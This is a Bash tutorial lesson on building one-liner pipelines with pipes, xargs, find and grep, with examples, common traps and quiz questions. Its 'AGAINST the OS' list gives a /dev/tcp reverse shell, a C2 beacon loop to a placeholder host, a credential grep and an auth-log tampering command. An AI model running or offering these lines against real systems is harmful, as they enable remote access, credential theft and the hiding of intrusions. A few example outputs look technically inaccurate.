# Lesson 16: Capstone — One-liner Combos

## History & Origins

The "one-liner" is as old as Unix pipes (V3, 1973). Doug McIlroy, who invented pipes, famously said: "This is the Unix philosophy: Write programs that do one thing and do it well. Write programs to work together. Write programs to handle text streams, because that is a universal interface."

One-liners are the ultimate expression of this philosophy. Each small command does one thing. Pipes compose them into data-processing pipelines. The result is often more powerful and more readable than a 50-line Python script.

The Bash one-liner culture peaked in the 1990s-2000s on USENET and early web forums, where sysadmins would compete to solve problems in the fewest characters. Sites like commandlinefu.com preserve this tradition. Many one-liner tricks were passed down orally (or via .sig files) — things like `sudo !!` (rerun last command as root) and `^foo^bar` (quick substitution) are part of the shared lore.

This lesson contains NO new material. Every technique here reuses something from Lessons 1-15. The goal is synthesis: by the end, you'll be able to compose commands fluidly without reaching for a script file.

## Philosophy of the One-liner

A "one-liner" is NOT about fitting everything on one physical line. It's about solving a problem as a single command pipeline, without creating a script file. You can use `\` line continuations for readability. The point is the pipeline, not the line count.

**The mental model:** Each command is a filter. Input comes from a file or previous command. Output goes to the next command or the terminal. You're building a data-processing assembly line.

```
[data source] -> filter1 -> filter2 -> filter3 -> [output]
     |            |           |           |
   cat/grep     sort       uniq -c     sort -rn
```

### Building blocks from every lesson:
1. Navigation: `cd`, `ls`, `pwd`, `realpath`
2. File ops: `cp`, `mv`, `rm`, `mkdir`, `ln`
3. Globbing: `*`, `?`, `[]`, `{}`, `**`, `extglob`
4. Reading: `cat`, `head`, `tail`, `less`, `xxd`
5. Counting/sorting: `wc`, `sort`, `cut`, `uniq`, `tr`
6. Redirection: `>`, `>>`, `<`, `2>`, `&>`, `tee`
7. Pipes: `|`, `|&`, `PIPESTATUS`
8. Variables: `$var`, `${var}`, quoting, `$()`
9. Environment: `$PATH`, `alias`, `source`
10. Scripting: `$?`, `exit`, `read`
11. Conditionals: `&&`, `||`, `if`
12. File tests: `-f`, `-d`, `-e`, `-r`, `-w`, `-x`
13. Loops: `for`, `while`
14. Functions: `() { }`, `local`
15. Regex: `=~`, `BASH_REMATCH`

## Syntax Reference (Pipeline Patterns)

### Basic pipeline patterns
```bash
cmd1 | cmd2                     # stdout of cmd1 -> stdin of cmd2
cmd1 |& cmd2                    # stdout AND stderr -> cmd2
cmd1 | cmd2 | cmd3              # Multi-stage pipeline
cmd1 | tee /tmp/debug | cmd2    # tee saves intermediate to file
cmd1 | cmd2 | cmd3 > output     # Final output to file
cmd1 | cmd2 2>/dev/null         # Suppress errors from cmd2
```

### Subshells and grouping
```bash
(cmd1; cmd2) | cmd3             # Group commands in subshell
{ cmd1; cmd2; } | cmd3          # Group without subshell
```

### Conditionals in pipelines
```bash
cmd1 && cmd2 || cmd3            # If cmd1 succeeds run cmd2, else cmd3
cmd1 | cmd2 && echo "Piped chain succeeded"
```

### Process substitution
```bash
diff <(cmd1) <(cmd2)            # Compare outputs of two commands
while read line; do ... done < <(cmd)
```

### Compound commands
```bash
for f in *.txt; do wc -l "$f"; done | sort -rn
while read line; do [[ "$line" =~ pattern ]] && echo "$line"; done < file
```

### xargs patterns
```bash
cmd1 | xargs cmd2               # Use output as arguments
cmd1 | xargs -n 1 cmd2          # One argument per invocation
cmd1 | xargs -P 4 cmd2          # Run 4 parallel processes
cmd1 | xargs -I {} cp {} {}.bak  # Replace {} with argument
cmd1 | xargs -0 cmd2            # Null-delimited (for filenames with spaces)
```

### find patterns
```bash
find . -name "*.txt" -exec wc -l {} \;         # Exec for each
find . -name "*.txt" -exec wc -l {} +           # Exec with all args
find . -name "*.txt" -print0 | xargs -0 wc -l   # Safe for special chars
```

## Core Examples (12)

### Example 1: Find the 10 Largest Files in a Directory
```bash
$ du -sh /var/log/* | sort -rh | head -10
12M     /var/log/syslog
8.2M    /var/log/kern.log
4.5M    /var/log/auth.log
2.1M    /var/log/dpkg.log
1.8M    /var/log/apt
```
Pipeline: `du -sh` gets sizes. `sort -rh` sorts reverse human-readable. `head -10` takes top 10.

**What if:** You want files recursively? Use `find /var/log -type f -exec du -sh {} + | sort -rh | head -10`.

### Example 2: Count File Extensions
```bash
$ ls /usr/bin | rev | cut -d. -f1 | rev | sort | uniq -c | sort -rn | head -10
   2012
    342 py
    120 pl
     85 sh
     32 rb
     28 php
      7 exe
      3 bin
```
`ls /usr/bin` lists files. `rev` reverses each line. `cut -d. -f1` takes the first field (which was the extension). `rev` reverses back. `sort | uniq -c` counts. `sort -rn` sorts by count descending. `head -10` shows top 10.

Note: Files without an extension end up with their full name (reversed and cut, which takes the whole reversed string). The blank line at top represents files with no extension.

### Example 3: Extract IPs from auth.log
```bash
$ grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' /var/log/auth.log | sort -u
10.0.0.1
10.0.0.2
192.168.1.100
```
`grep -oE` outputs only matching text (not full lines). The regex matches IPv4 addresses with word boundaries `\b`. `sort -u` gives unique, sorted results.

### Example 4: Failed Login Summary
```bash
$ grep "Failed password" /var/log/auth.log | grep -oP 'from \K\S+' | sort | uniq -c | sort -rn
    142 from 10.0.0.100
     23 from 192.168.1.50
      3 from 10.0.0.1
```
`grep "Failed password"` filters for failed attempts. `grep -oP 'from \K\S+'` uses Perl-compatible regex with `\K` (keep out) to extract the IP after "from ". `sort | uniq -c | sort -rn` gives sorted counts.

### Example 5: Batch Compress Old Logs
```bash
$ find /var/log -name "*.log" -mtime +7 -exec gzip {} \; && echo "Compressed old logs"
```
`find` locates `.log` files older than 7 days. `-exec gzip {} \;` compresses each. `&& echo` confirms success.

### Example 6: Directory Tree with Sizes
```bash
$ du -h --max-depth=2 /usr | sort -rh | head -20
2.5G    /usr
1.2G    /usr/lib
850M    /usr/share
345M    /usr/bin
```
`du -h --max-depth=2` shows sizes up to 2 subdirectories deep. `sort -rh` sorts by size. `head -20` limits output.

### Example 7: Rename All .txt to .md
```bash
$ for f in *.txt; do mv "$f" "${f%.txt}.md"; done
```
No pipe needed — this is a shell loop one-liner. The `${f%.txt}` removes `.txt` suffix; `.md` is appended.

### Example 8: Show Total Lines of Code in Python Files
```bash
$ find . -name "*.py" -exec wc -l {} + | tail -1
  15234 total
```
Or skip the total line:
```bash
$ find . -name "*.py" -exec cat {} + | wc -l
15234
```
`find ... -exec cat {} +` cats all Python files. `wc -l` counts total lines.

### Example 9: Find Duplicate Files by Checksum
```bash
$ find /etc -type f -exec sha256sum {} + | sort | uniq -w64 -d
```
`sha256sum` computes checksums. `sort` groups same checksums. `uniq -w64 -d` shows only duplicates by comparing first 64 characters (the hash).

### Example 10: Show Terminal Colors
```bash
$ for i in {0..255}; do printf "\e[48;5;%sm %3d \e[0m" "$i" "$i"; (( (i+1) % 16 == 0 )) && echo; done
```
This loop prints all 256 terminal colors in a grid. `\e[48;5;Nm` sets background to color N. The `(( (i+1) % 16 == 0 ))` adds a newline every 16 colors.

### Example 11: Kill Processes Matching a Pattern
```bash
$ ps aux | grep "python" | grep -v grep | awk '{print $2}' | xargs kill -9
```
`ps aux` lists all processes. `grep "python"` filters for python. `grep -v grep` removes the grep itself. `awk '{print $2}'` extracts PIDs. `xargs kill -9` kills them.

**WARNING:** Be very careful with this one-liner! Test with `... | xargs echo` first to see what would be killed.

### Example 12: Watching a Command Repeatedly
```bash
$ watch -n 2 'df -h / | tail -1'
```
`watch` runs a command every N seconds. This shows disk usage for `/` updating every 2 seconds.

Or without `watch`:
```bash
$ while true; do clear; date; df -h /; sleep 2; done
```

## Real-World Use Cases

### 1. FOR the OS — Administration, Automation, System Maintenance
- **Disk space hogs**: `du -sh /* 2>/dev/null | sort -rh | head -10`
- **Failed SSH attempts**: `grep "Failed password" /var/log/auth.log | wc -l`
- **Recent reboots**: `last reboot | head -5`
- **Open ports**: `ss -tuln | grep LISTEN`
- **Top memory processes**: `ps aux --sort=-%mem | head -10`

### 2. WITH the OS — Development, Data Processing, Daily Workflow
- **Count lines of code**: `git ls-files | xargs wc -l | tail -1`
- **File backup with date**: `cp file.txt{,.bak.$(date +%F)}`
- **Convert all images**: `for f in *.png; do convert "$f" "${f%.png}.jpg"; done`
- **Extract URLs from file**: `grep -oE 'https?://[^ ]+' file.txt | sort -u`
- **Search and replace in files**: `sed -i 's/old/new/g' *.txt`

### 3. AGAINST the OS — Exploitation, Bypasses, Attacks
- **Reverse shell**: `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`
- **C2 heartbeat**: `while true; do curl -s http://c2.example.com/beacon; sleep 60; done`
- **Credential search**: `grep -r "password" /etc /home --include="*.conf" --include="*.txt" 2>/dev/null`
- **Log tampering**: `sed -i '/malicious/d' /var/log/auth.log`
- **Privilege check**: `find / -perm -4000 -o -perm -2000 2>/dev/null`

### 4. FOR DEFENSE — Detection, Prevention, Auditing
- **New SUID binaries**: `find / -perm -4000 -mtime -1 2>/dev/null`
- **Suspicious cron jobs**: `for d in /etc/cron* /var/spool/cron; do ls -la "$d" 2>/dev/null; done`
- **Listening ports check**: `ss -tuln | grep -E ':(22|80|443|8080)'`
- **Log surge detection**: `wc -l /var/log/auth.log && sleep 60 && wc -l /var/log/auth.log`
- **Integrity check**: `find /bin /sbin -type f -exec sha256sum {} \; | sort > /tmp/baseline`

## Memory Aids

- **Pipes are assembly lines**: Each command is a station. Data flows left to right, transformed at each station.
- **`du -sh | sort -rh | head`**: The "three amigos" for finding big files. "Size, Sort, Show."
- **`grep | sort | uniq -c | sort -rn`**: The "frequency pattern." Count anything's frequency.
- **`find ... -exec {} +`**: The `+` form is "batch mode" — like a pipeline for `find`.
- **`xargs`**: Think "X = multiply, args = arguments" — multiply one input into many arguments.
- **`tee`**: Named after a T-pipe in plumbing. It SPLITS the flow — one branch to file, one continues.
- **`$$` in one-liners**: Your PID. Useful for temp files: `/tmp/script_$$.tmp`.

## Trap Vault (12 traps)

### Trap 1: One-liner Too Clever
**Problem:** The one-liner works but nobody can understand it.
**Example:**
```bash
$ ps aux | awk '{for(i=11;i<=NF;i++) printf "%s ", $i; print ""}' | grep -i "error" | ...
```
**Why:** Some one-liners become write-only code. If you need a comment to explain it, it should be a script.
**Fix:** Use `\` line continuations, intermediate files with `tee`, or just write a script.

### Trap 2: grep -oP Uses PCRE, Not ERE
**Problem:** `grep -oP` uses Perl-compatible regex, not POSIX ERE like bash `=~`.
**Example:**
```bash
$ echo "hello123" | grep -oP '\d+'
123
$ echo "hello123" | grep -oE '\d+'
# No output — \d is not POSIX ERE!
```
**Fix:** Know which tool uses which regex flavor. `grep -P` = PCRE, `grep -E` = ERE, `grep` = BRE. In scripts, prefer ERE for portability.

### Trap 3: Pipes Hide Errors
**Problem:** A command in the pipeline fails silently.
**Example:**
```bash
$ ls /nonexistent | sort | uniq | head
ls: cannot access '/nonexistent': No such file or directory
# The sort|uniq|head still ran on empty input
# Exit code is HEAD's exit code, not ls's!
```
**Why:** Each pipe segment runs in parallel. Exit code of the pipeline is the exit code of the LAST command.
**Fix:** Check `PIPESTATUS` array: `${PIPESTATUS[0]}` is the exit code of the first command. In scripts, `set -o pipefail` causes the pipeline to fail if ANY command fails.

### Trap 4: xargs With Spaces in Filenames
**Problem:** `xargs` splits on spaces by default.
**Example:**
```bash
$ find /tmp -name "*.txt" | xargs wc -l
wc: /tmp/file: No such file or directory
wc: with: No such file or directory
wc: spaces.txt: No such file or directory
```
**Why:** `find` outputs `./file with spaces.txt`. `xargs` splits on spaces, treating it as three arguments.
**Fix:** Use `find ... -print0 | xargs -0` — null-delimited, the only safe way.

### Trap 5: for f in $(...) — Word Splitting + Glob Expansion
**Problem:** `for f in $(command)` splits on whitespace and expands globs.
**Example:**
```bash
$ for f in $(find /tmp -name "*.txt"); do echo "$f"; done
```
**Fix:** Use `while IFS= read -r -d '' f < <(find /tmp -name "*.txt" -print0)` for safe iteration.

### Trap 6: Watch Out for Destructive One-liners
**Problem:** A one-liner deletes files when you didn't intend.
**Example:**
```bash
$ find . -name "*.tmp" -delete  # Oops, that was a typo
```
**Fix:** ALWAYS preview with `echo` or `-print` first: `find . -name "*.tmp" -print` then verify before adding `-delete`.

### Trap 7: tee Overwrites by Default
**Problem:** `tee` truncates the file before writing.
**Example:**
```bash
$ echo "new" | tee file | wc   # Overwrites file, doesn't append!
```
**Fix:** Use `tee -a` for append mode.

### Trap 8: Single > vs >> — Truncation Surprise
**Problem:** Using `>` when you meant `>>`.
**Example:**
```bash
$ echo "header" > report.csv
$ curl -s http://api.example.com/data | while read line; do echo "$line" > report.csv; done
# Only the LAST line made it!
```
**Fix:** Use `>>` to append, or redirect the entire loop: `while ... done > report.csv`.

### Trap 9: awk/sed Modifying Files In-Place
**Problem:** `awk` can't modify files in-place like `sed -i`.
**Example:**
```bash
$ awk '{print $1}' file.txt > file.txt  # EMPTIES file!
```
**Why:** The `>` redirection opens and truncates the file BEFORE awk reads it.
**Fix:** Use a temp file: `awk '{print $1}' file.txt > /tmp/tmp && mv /tmp/tmp file.txt`.

### Trap 10: Command Substitution in Quotes vs Without
**Problem:** `$(cmd)` without quotes splits output.
**Example:**
```bash
$ files=$(ls /tmp)  # Stores all filenames, but without quotes loses newlines
```
**Fix:** `"$(cmd)"` preserves newlines. For arrays: `arr=($(cmd))` splits, but `arr=("$(cmd)")` stores as one element.

### Trap 11: Backticks vs $() Nesting
**Problem:** Backticks can't be nested.
**Example:**
```bash
$ echo `echo \`echo test\``  # Messy escaping
$ echo $(echo $(echo test))  # Clean nesting
```
**Fix:** Always use `$()` for command substitution — it's nestable, clearer, and consistent.

### Trap 12: sudo !! in One-liners
**Problem:** `sudo !!` doesn't work in one-liners.
**Example:**
```bash
$ echo "test" > /etc/hosts  # Permission denied
$ sudo !!                    # Runs "sudo echo "test" > /etc/hosts" — STILL permission denied!
```
**Why:** `!!` expands to the previous command. But `sudo !!` runs the command as root, but the `>` redirection happens in the CURRENT shell, not in the sudo context.
**Fix:** `sudo bash -c 'echo "test" > /etc/hosts'` or use `tee`: `echo "test" | sudo tee -a /etc/hosts`.

## See It In The Wild

### System admin one-liners
```bash
# Show disk usage per directory (deepest first)
$ du -xh / | sort -h

# Find the newest file in /var/log
$ ls -lt /var/log/*.log | head -5

# Show processes using swap
$ for pid in /proc/*/status; do awk '/VmSwap|Name/{printf "%s ", $2}END{print ""}' "$pid" 2>/dev/null; done | grep -v " kB$"
```

### Try this now:
```bash
# 1. Build a pipeline piece by piece:
$ ls /var/log               # Step 1: see the files
$ ls -lh /var/log           # Step 2: with sizes
$ ls -lhS /var/log          # Step 3: sorted by size
$ ls -lhS /var/log | head   # Step 4: top 10

# 2. Count frequency of words in a file:
$ cat /etc/passwd | tr ':' '\n' | sort | uniq -c | sort -rn | head

# 3. Safe renaming with preview:
$ echo mv "${f%.txt}.md"    # Preview first!
$ for f in *.txt; do echo mv "$f" "${f%.txt}.md"; done  # Preview all
$ for f in *.txt; do mv "$f" "${f%.txt}.md"; done       # Actually do it
```

## Check Your Understanding (7 questions)

1. What is the difference between `find -exec` and piping to `xargs`?

2. Why does `ls /usr/bin | rev | cut -d. -f1 | rev` work for extensions? What is the limitation?

3. How would you safely preview a destructive one-liner before running it?

4. What does `-oE` in `grep -oE` do?

5. How would you add error handling to a one-liner that deletes files?

6. Why does `sudo !!` not work for commands with redirections?

7. What is `PIPESTATUS` and when would you use it?

## More Examples (extra)

### Example 13: Summarize Disk Usage by Directory Type
```bash
$ du -sh /usr/*/ 2>/dev/null | sort -rh
1.5G    /usr/lib/
850M    /usr/share/
345M    /usr/bin/
...
```

### Example 14: Find All Broken Symlinks
```bash
$ find . -xtype l 2>/dev/null
```
`-xtype l` finds symlinks whose TARGET doesn't exist (broken symlinks).

### Example 15: Count Connections by State
```bash
$ ss -tuna | tail -n +2 | awk '{print $1}' | sort | uniq -c | sort -rn
   45 ESTAB
   12 TIME-WAIT
    3 LISTEN
```

### Example 16: Generate a Strong Random Password
```bash
$ openssl rand -base64 16 | head -c 20
aB3$xK9mPqR7vW2zN5jL
```

### Example 17: Rename Files Using sed-style Substitution
```bash
$ for f in image_*.jpg; do mv "$f" "${f/image_/photo_}"; done
```
No pipes needed — pure shell parameter expansion.

### Example 18: Show a Live-Updating Clock With date and tput
```bash
$ while clear; do tput cup 0 0; date; sleep 1; done
```

## More Real World

### Using tee for Pipeline Debugging
```bash
$ cat /var/log/syslog | tee /tmp/syslog-raw.txt | grep -i error | tee /tmp/errors-only.txt | wc -l
```
`tee` saves intermediate results. Check `/tmp/syslog-raw.txt` and `/tmp/errors-only.txt` to debug the pipeline.

### Using xargs -p for Interactive Confirmation
```bash
$ find /tmp -name "*.tmp" -print | xargs -p rm
```
`-p` prompts before each execution. Type `y` to confirm, anything else to skip.

### Using & for Background + Parallelism
```bash
$ for url in $(cat urls.txt); do curl -O "$url" & done; wait
```
All downloads run in parallel (background). `wait` ensures the script doesn't exit before they all finish.

## Check Your Understanding (continued)

8. What is the purpose of `tee` in a pipeline?

9. How would you run multiple commands in parallel using bash one-liners?

10. What is the difference between `$(cmd)` and `${cmd}` (if there is one)?

11. How does `xargs -0` work and when is it necessary?

12. Why should you always quote `$@` in scripts but may not need to in some one-liners?
